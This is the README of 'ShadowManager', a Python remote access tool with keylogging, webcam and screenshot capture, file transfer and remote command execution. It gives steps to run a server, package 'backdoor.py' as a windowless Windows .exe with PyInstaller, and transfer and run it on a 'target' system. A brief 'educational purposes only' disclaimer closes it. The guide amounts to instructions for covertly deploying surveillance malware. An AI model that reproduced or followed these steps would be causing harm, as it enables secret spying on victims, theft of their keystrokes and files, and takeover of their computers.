# ShadowManager

A remote access tool designed for educational purposes, showcasing how remote file operations, screenshots, webcam access, and keylogging work.

## Features

- **Screenshot Capture**: Take screenshots remotely.
- **Webcam Snapshot**: Capture images from the webcam.
- **Keylogger**: Record keystrokes.
- **File Management**: Upload and download files.
- **Command Execution**: Run shell commands remotely.

## Installation

### Navigate to the Project Directory

```bash
cd ShadowManager
```

### Install the Required Python Dependencies

```bash
pip install -r requirements.txt
```

### Usage

## Start the Server

```bash
python server.py
```

## Run theBackdoor on the Target System

```bash
python backdoor.py
```

### Converting backdoor.py to a .exe File on Windows

## Install PyInstaller

```bash
pip install pyinstaller
```

## Convert backdoor.py to a .exe File

```bash
pyinstaller --onefile --noconsole backdoor.py
```

- **onefile**: Packages everything into a single .exe file.
- **noconsole**: Prevents the console window from appearing when the .exe is run.

## Locate the .exe File

After running the above command, the .exe file will be in the dist folder inside your project directory.

## Transfer the .exe File or Download it to the Target

Transfer the .exe file to the target Windows system and run it.

### Disclaimer

This tool is for educational purposes only. Use responsibly and ethically.
